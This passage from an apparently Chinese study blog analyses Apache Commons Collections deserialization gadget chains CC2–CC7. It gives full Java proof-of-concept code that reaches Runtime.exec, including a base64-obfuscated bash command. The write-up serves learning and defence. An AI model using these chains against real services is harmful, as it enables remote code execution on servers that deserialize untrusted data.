name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n## 解析\n\n### `PriorityQueue.readObject()`\n\n这里同理需要看一下`writeObject`函数\n\n![image-20220805165712958](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805165712958.png)\n\n也是对应读写的，所以可以利用反射设置`PriorityQueue`的`queue`，使其可控，然后进入下面的`heapify()`函数\n\n### `PriorityQueue.heapify()`\n\n![image-20220805170040301](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170040301.png)\n\n再进入`siftDown`\n\n### `PriorityQueue.siftDown()`\n\n其中`comparator`利用反射设置为`TransformingComparator`，随后进入`siftDownUsingComparator`函数\n\n![image-20220805170115164](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170115164.png)\n\n### `PriorityQueue.siftDownUsingComparator()`\n\n调用到实现了`Comparator`接口的`TransformingComparator.comparator()`函数\n\n![image-20220805170501655](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170501655.png)\n\n### `TransformingComparator.comparator()`\n\n那么之前利用反射设置了`TransformingComparator.transformer`为`InvokerTransformer`，那么就可以调用到`InvokerTransformer.transoform`，并且其参数即为这里的`obj1`，也为`PriorityQueue.queue`，这个之前设置为了`TemplatesImpl`，即最后可调用到经典链子`ITN`，完成利用。\n\n![image-20220805170750082](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170750082.png)\n\n\n\n\n\n\n\n\n\n# 三、CC3\n\n## JAVA源码版本-8u40\n\n![image-20220806110944484](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110944484.png)\n\n细节如下\n\n```\nAnnotationInvocationHandler.readObject()\nMap(Proxy).entrySet()\nAnnotationInvocationHandler.invoke()\nLazyMap.get()\nChainedTransformer.transform()\n```\n\n之后的链子就是经典`CITTN`链了\n\n## 限制\n\n`JDK`版本：暂无\n\n## POC\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class CC3 {\n\n    public static void main(String[] args) throws Exception {\n        //构建字节码\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.makeClass(\"test\");\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"touch aaaa\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] classBytes = ctClass.toBytecode();\n        TemplatesImpl templates = TemplatesImpl.class.newInstance();\n        setField(templates, \"_bytecodes\", new byte[][]{classBytes});\n        setField(templates, \"_name\", \"name\");\n        setField(templates, \"_class\", null);\n\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n            new ConstantTransformer(TrAXFilter.class),\n            new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})\n        });\n\n        HashMap innermap = new HashMap();\n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);\n\n        // 创建一个与代理对象相关联的InvocationHandler map_handler\n        Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class);\n        handler_constructor.setAccessible(true);\n        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);\n\n        // 创建代理对象proxy_map来代理map_handler，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法\n        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);\n\n        //再创建一个AnnotationInvocationHandler对象，用来触发代理对象proxy_map的方法执行,从而跳转AnnotationInvocationHandler.voker()\n        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc3\"));\n            outputStream.writeObject(handler);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc3\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n## 解析\n\n即按照`CC1`的前半部分链子加上经典的`CITTN`即可，不过多赘述了\n\n\n\n\n\n# 四、CC4\n\n## JAVA源码版本-8u40\n\n![image-20220807120904293](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807120904293.png)\n\n细节如下：\n\n```\nPriorityQueue.readObject()->heapify()->siftDown()->siftDownUsingComparator()\nTransformingComparator.compare()\nChainedTransformer.transform()\nInstantiateTransformer.transform()\nTrAXFilter构造函数\n```\n\n## 限制\n\n`JDK`版本：暂无\n\n`PriorityQueue`在`commons-collections4`下才开始有\n\n```xml\n<dependency>\n    <groupId>org.apache.commons</groupId>\n    <artifactId>commons-collections4</artifactId>\n    <version>4.0</version>\n</dependency>\n```\n\n## POC\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport javassist.*;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InstantiateTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport javax.xml.transform.Templates;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\npublic class CC4 {\n    public static void main(String[] args) throws Exception {\n        //构建字节码\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.makeClass(\"test\");\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"touch aaaa\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] classBytes = ctClass.toBytecode();\n        TemplatesImpl templates = TemplatesImpl.class.newInstance();\n        setField(templates, \"_bytecodes\", new byte[][]{classBytes});\n        setField(templates, \"_name\", \"name\");\n        setField(templates, \"_class\", null);\n\n\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})\n        });\n\n        TransformingComparator comparator = new TransformingComparator(chain);\n        PriorityQueue queue = new PriorityQueue();\n        //不用设置PriorityQueue.queue为TemplatesImpl,因为TrAXFilter构造函数可以直接触发\n        setField(queue,\"size\",2);\n        setField(queue,\"comparator\",comparator);\n\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc4\"));\n            outputStream.writeObject(queue);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc4\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n\n\n\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n## 解析\n\n感觉和`CC2`差不多，就是后面的利用链子，由于是`TrAXFilter`构造函数直接触发的，所以不用设置`PriorityQueue.queue`为`TemplatesImpl`，没有什么太多的亮点。\n\n# 五、CC5\n\n## JAVA源码版本-8u40\n\n![image-20220801095044379](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801095044379.png)\n\n细节如下\n\n```\nBadAttributeValueExpException.readObject()\nTiedMapEntry.toString()->getValue()\nLazyMap.get()\nChainedTransformer.transform()\n```\n\n## 限制\n\n`JDK`版本：暂无\n\n## POC\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\n\npublic class CC5 {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {null, new Object[0] }),\n                new InvokerTransformer(\"exec\", new Class[] {\n                        String.class }, new Object[]{\"./test.sh\"})});\n        HashMap innermap = new HashMap();\n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);\n        //调用Get方法\n        TiedMapEntry tiedmap = new TiedMapEntry(map,123);\n        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);\n        //BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);\n        Field val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\");\n        val.setAccessible(true);\n        val.set(poc,tiedmap);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc5\"));\n            outputStream.writeObject(poc);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc5\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n\n\n## 解析\n\n### `BadAttributeValueExpException.readObject()`\n\n![image-20220801110613623](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110613623.png)\n\n`valObj`即为`TiedMapEntry`\n\n### `TiedMapEntry.toString()->getValue()`\n\n![image-20220801110414584](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110414584.png)\n\n后续的`map`即为`LazyMap`，`key`为`123`\n\n![image-20220801110428194](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110428194.png)\n\n### `LazyMap.get()`\n\n还是经典的链子`CIR`\n\n![image-20220801110714702](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png)\n\n\n\n## 🔺注\n\n在设置`BadAttributeValueExpException`对象时，使用的是其中的`Field`来进行设置的\n\n```java\nBadAttributeValueExpException poc = new BadAttributeValueExpException(1);\nField val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\");\nval.setAccessible(true);\nval.set(poc,tiedmap);\n```\n\n原因在于在`BadAttributeValueExpException`构造函数及`readObject`函数中，有如下代码\n\n![image-20220801151544294](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151544294.png)\n\n这样就能在序列化时不进行本地`RCE`，而在服务器反序列化时进行`RCE`，因为如果在序列化时进行本地`RCE`，`val`就会由于链子变成`Runtime`类，由于`Runtime`没办法直接序列化，所以其`val`就会变成如下执行命令结果的字符串，从而在反序列时没办法调用到`TiedMapEntry.toString()`\n\n![image-20220801151900635](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151900635.png)\n\n对比原`POC`如下，其`val`在序列化时还是一个`TiedMapEntry`对象\n\n![image-20220801152047107](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801152047107.png)\n\n## 无数组\n\n至于无数组版本的，即如下所示\n\n![image-20220802155244072](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802155244072.png)\n\n做点小改动，在`TiedMapEntry`中传入`TemplatesImpl`即可，确保在`LazyMap.get()`的时候，传入的`key`为`TemplatesImpl`，从而进行调用到对应的`TemplatesImpl.newTransformer()`。\n\n![image-20220802154737033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802154737033.png)\n\n相关`POC`如下\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.CannotCompileException;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.NotFoundException;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\nimport test.test;\n\nimport javax.management.BadAttributeValueExpException;\nimport javax.xml.transform.Templates;\nimport java.io.*;\nimport java.lang.reflect.Array;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class CC5T {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException, IOException {\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.get(test.class.getName());//新建一个test类，没啥用\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"bash -c {echo,Li90ZXN0LnNo}|{base64,-d}|{bash,-i}\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] bytes = ctClass.toBytecode();\n        TemplatesImpl tempIm = new TemplatesImpl();\n        setField(tempIm, \"_name\", \"asd\");\n        setField(tempIm, \"_bytecodes\", new byte[][]{bytes});\n        setField(tempIm, \"_tfactory\", new TransformerFactoryImpl());\n        InvokerTransformer invTransf = new InvokerTransformer(\"newTransformer\", null, null);\n\n        HashMap innermap = new HashMap();\n\n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);\n        //调用Get方法\n        TiedMapEntry tiedmap = new TiedMapEntry(map,tempIm);\n        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);\n        //BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);\n        setField(poc,\"val\",tiedmap);\n\n\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc5\"));\n            outputStream.writeObject(poc);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc5\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n\n\n# 六、CC6\n\n## JAVA源码版本-8u40\n\n![image-20220801171443518](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171443518.png)\n\n细节如下\n\n```\nHashSet.readObject()\nHashMap.put()->hash()\nTiedMapEntry.hashCode()->this.getValue()\nLazyMap.get()\nChainedTransformer.transform()\n```\n\n## 限制\n\n`JDK`版本：暂无限制\n\n## Poc\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class CC6 {\n\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(\"exec\",\n                        new Class[] { String.class }, new Object[]{\"./test.sh\"})});\n\n        HashMap innermap = new HashMap();\n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);\n\n        TiedMapEntry tiedmap = new TiedMapEntry(map,123);\n\n        HashSet hashset = new HashSet(1);\n        hashset.add(\"foo\");\n\n        Field field = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\");\n        field.setAccessible(true);\n        HashMap hashset_map = (HashMap) field.get(hashset);\n\n        Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\");\n        table.setAccessible(true);\n        Object[] array = (Object[])table.get(hashset_map);\n\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n\n        Field key = node.getClass().getDeclaredField(\"key\");\n        key.setAccessible(true);\n        key.set(node,tiedmap);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc6\"));\n            outputStream.writeObject(hashset);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc6\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n## 解析\n\n### `HashSet.readObject()`\n\n![image-20220801171648405](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171648405.png)\n\n这个`map`即设置为`HashMap`\n\n### `HashMap.put()`\n\n![image-20220801171743740](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171743740.png)\n\n这个`key`后续设置为`TiedMapEntry`\n\n![image-20220801171856068](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171856068.png)\n\n### `TiedMapEntry.hashCode()`\n\n![image-20220801171928099](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171928099.png)\n\n![image-20220801171953683](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171953683.png)\n\n这里的`map`即设置为`Lazymap`\n\n### `LazyMap.get()`\n\n还是经典的链子`CIR`\n\n![image-20220801110714702](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png)\n\n\n\n## 🔺注\n\n### 1.`Hashset`设置\n\n```java\nHashSet hashset = new HashSet(1);\n\n//添加至少一个元素，方便后续获取\nhashset.add(\"aaa\");\n\nField field = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\");\nfield.setAccessible(true);\nHashMap hashset_map = (HashMap) field.get(hashset);\n```\n\n获取`HashSet`的`map`成员为`hashset_map`\n\n### 2.`HashMap`设置\n\n```java\n//获取HashMap中的table,用来获取HashMap中保存的元素\n//transient Node<K,V>[] table;\nField table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\");\ntable.setAccessible(true);\n\n//获取array为HashSet的成员map中保存的元素数组\nObject[] array = (Object[])table.get(hashset_map);\n//获取node为保存在hashset中的元素,其类为一个hashmap\nObject node = array[0];\nif(node == null){\n    node = array[1];\n}\n\n//设置hashset中的一个元素hashmap的key为TiedMapEntry\nField key = node.getClass().getDeclaredField(\"key\");\nkey.setAccessible(true);\nkey.set(node,tiedmap);\n```\n\n### 3.`writeObject`和`readObject`的关系\n\n在`HashSet`的`readObject`中可以看到，`//..`为省略的代码部分\n\n```java\nprivate void readObject(java.io.ObjectInputStream s)\n    throws java.io.IOException, ClassNotFoundException {\n    s.defaultReadObject();\n\n    int capacity = s.readInt();\n\t//.....\n    float loadFactor = s.readFloat();\n\t//.....\n    int size = s.readInt();\n\t//.......\n    for (int i=0; i<size; i++) {\n        @SuppressWarnings(\"unchecked\")\n        E e = (E) s.readObject();\n        map.put(e, PRESENT);\n    }\n}\n```\n\n按理说，调用`map.put`，其函数如下，我们需要控制`e`(即下面的`key`)为`TiedMapEntry`才能调用到`TiedMapEntry.hashCode`\n\n```java\npublic V put(K key, V value) {\n    return putVal(hash(key), key, value, false, true);\n}\n```\n\n但是`E e = (E) s.readObject();`，也就是得看对应的`HashSet.writeObject`中将什么序列化了\n\n```java\nprivate void writeObject(java.io.ObjectOutputStream s)\n    throws java.io.IOException {\n    // Write out any hidden serialization magic\n    s.defaultWriteObject();\n\n    // Write out HashMap capacity and load factor\n    s.writeInt(map.capacity());\n    s.writeFloat(map.loadFactor());\n    s.writeInt(map.size());\n\n    // Write out all elements in the proper order.\n    for (E e : map.keySet())\n        s.writeObject(e);\n}\n```\n\n可以看到，对应的写入`map`成员的`capacity`、`loadFactor`、`size`以及其中的所有元素，同时在`readObject`也是依照顺序一一对应进行读取，如下所示\n\n![image-20220801175923980](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801175923980.png)\n\n所以在`writeObject`的时候，在`HashSet`中的`map`成员的元素可控，那么在`readObject`的时候，对应的元素也是可控的，可以设置为`TiedMapEntry`。\n\n所以在`JAVA`中的`writeObject`和`readObject`是一一对应的，写入什么格式数据，就会依照什么格式数据读取。\n\n\n\n## CC3的HashMap版本\n\n这边顺带提一下以下这两条链子，其实都差不多，大同小异，主要是前面的不太一样，直接借用`HashMap`来进行触发。\n\n![image-20220806174412815](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806174412815.png)\n\n### POC\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\n\npublic class CC3_O {\n\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer(\"getMethod\", new Class[] {\n                String.class, Class[].class }, new Object[] {\n                \"getRuntime\", new Class[0] }),\n            new InvokerTransformer(\"invoke\", new Class[] {\n                Object.class, Object[].class }, new Object[] {\n                null, new Object[0] }),\n            new InvokerTransformer(\"exec\",\n                                   new Class[] { String.class }, new Object[]{\"touch ddd\"})});\n\n        HashMap hashmap = new HashMap();\n        hashmap.put(\"aaa\",\"bbb\");\n        hashmap.put(\"ccc\",\"ddd\");\n        LazyMap map = (LazyMap)LazyMap.decorate(hashmap,chain);\n        TiedMapEntry tiedmap = new TiedMapEntry(map,123);\n\n        Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\");\n        table.setAccessible(true);\n        Object[] array = (Object[])table.get(hashmap);\n\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n        setField(node,\"key\",tiedmap);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc3_o\"));\n            outputStream.writeObject(hashmap);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc3_o\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n也没啥好说的，往`HashMap`中放两个元素，使其`table`不为空，方便取出`node`来设置`TiedMapEntry`即可。\n\n其他的就相当于去掉了`HashSet`的`CC6`了，触发点在`HashMap.readObject()`下的计算`hash`的地方\n\n![image-20220806175025930](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806175025930.png)\n\n# 七、CC7\n\n## JAVA源码版本-8u40\n\n![image-20220802153315688](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802153315688.png)\n\n细节如下：\n\n```\nHashtable.readObject()->reconstitutionPut()\nLazyMap.equals()==AbstractMapDecorator.equals()\nAbstractMap.equals()\nLazyMap.get()\n```\n\n## 限制\n\n`JDK`版本：暂无限制\n\n## Poc\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.*;\n\npublic class CC7 {\n\n    public static void main(String[] args) throws Exception {\n        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",\n                        new Class[]{String.class, Class[].class},\n                        new Object[]{\"getRuntime\", new Class[0]}),\n                new InvokerTransformer(\"invoke\",\n                        new Class[]{Object.class, Object[].class},\n                        new Object[]{null, new Object[0]}),\n                new InvokerTransformer(\"exec\",\n                        new Class[]{String.class}, new Object[]{\"touch bbbb\"})\n        };\n\n        Map innerMap1 = new HashMap();\n        Map innerMap2 = new HashMap();\n\n        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);\n        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);\n\n        lazyMap1.put(\"zZ\", 1);\n        lazyMap2.put(\"yy\", 1);\n\n\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(lazyMap1, 1);\n        hashtable.put(lazyMap2, 2);\n\n        setField(transformerChain,\"iTransformers\",transformers);\n\n        lazyMap2.remove(\"zZ\");\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc7\"));\n            outputStream.writeObject(hashtable);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc7\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n```\n\n## 解析\n\n### `Hashtable.readObject()`\n\n![image-20220807102603926](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102603926.png)\n\n### `Hashtable.reconstitutionPut()`\n\n![image-20220807102732158](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102732158.png)\n\n由于`LazyMap`继承了`AbstractMapDecorator`，所以会调用到其`equals`函数\n\n### `LazyMap.equals()==AbstractMapDecorator.equals()`\n\n![image-20220807102940029](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102940029.png)\n\n这里的`equals`接着往下跳转就不知道为什么会直接跳到`AbstractMap.equals()`了\n\n### `AbstractMap.equals()`\n\n![image-20220807103216037](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103216037.png)\n\n### `LazyMap.get()`\n\n接着就是经典链子`CCI`了。\n\n![image-20220807103304810](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103304810.png)\n\n## 🔺注\n\n### 1.`hashtable.put`两次\n\n由于需要在`Hashtable.reconstitutionPut()`中进入该循环，所以需要`hashtable.put`两次，\n\n![image-20220807104841649](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807104841649.png)\n\n### 2.反射设置`CCI`链子\n\n如果直接进行设置，那么在本地`hashtable.put`的时候也会触发`RCE`，那么在`hashtable.put`之后再设置`CCI`链，就不会本地触发`RCE`了，这样是为了防止非预期的一些东西，就像在之前`CC5`中预防本地`RCE`一样。\n\n![image-20220807105255253](../../../../AppData/Roaming/Typora/typora-user-images/image-20220807105255253.png)\n\n### 3.hash碰撞\n\n为什么`put`的时候需要`yy`和`zZ`，这样是为了使得其生成的`hash`相同，从而能够进行比较，在`Hashtable.reconstitutionPut()`中能够通过前面的`hash`相等条件\n\n![image-20220807114011896](../../../../AppData/Roaming/Typora/typora-user-images/image-20220807114011896.png)\n\n当然换成其他的能够进行`hash`碰撞的也是一样的。\n\n### 